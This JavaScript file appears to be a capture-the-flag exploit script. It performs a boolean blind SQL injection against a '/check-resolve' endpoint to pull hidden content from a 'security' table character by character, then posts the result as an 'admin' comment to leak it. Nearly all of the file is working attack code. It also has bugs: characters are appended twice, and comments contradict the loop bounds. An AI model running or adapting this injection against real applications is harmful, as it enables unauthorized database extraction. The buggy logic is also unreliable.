// Base information
const url = '/check-resolve';
const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&()*+,-./:;<=>?@[]^_`{|}~'; 
let discovered_content = '';

// Function to check if a character is correct
function checkCharacter(position, character) {
  const data = new URLSearchParams({
    id: `1 and (SELECT hex(substr(content,${position},1)) FROM security WHERE id = 6) = hex('${character}')`
  });
  return fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: data
  })
  .then(response => response.text())
  .then(text => {
    if (text.includes("Done")) {
      discovered_content += character;
      return true; 
    }
    return false; 
  });
}

// Function to send the discovered content
function postDiscoveredContent() {
  const postData = new URLSearchParams({
    comment2: discovered_content,
    "comment-author": "admin"
  });

  return fetch("/post-comment", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: postData
  })
}

async function findContent() {
  let startPosition = 0; // Starting from the 11th character
  let content_length = 10; // Limit to the 20th character
  for (let position = startPosition; position <= content_length; position++) {
    let foundChar = false;
    for (const char of characters) {
      const found = await checkCharacter(position, char);
      if (found) {
        foundChar = true;
        discovered_content += char; // Append the found character to the discovered content
        if (char === "}") {
          console.log("End of content reached with '}'.");
          postDiscoveredContent();
          return; // Exit the function if the end marker is found
        }
        break; // Exit the character loop early if the correct character is found
      }
    }
    if (!foundChar) {
      console.log(`Character not found at position: ${position}. May have reached the end of content.`);
      break; // Break the loop if no character matches at the current position, indicating the end of content
    }
  }
  postDiscoveredContent(); // Send the discovered content if the loop completes without finding "}"
}

findContent();
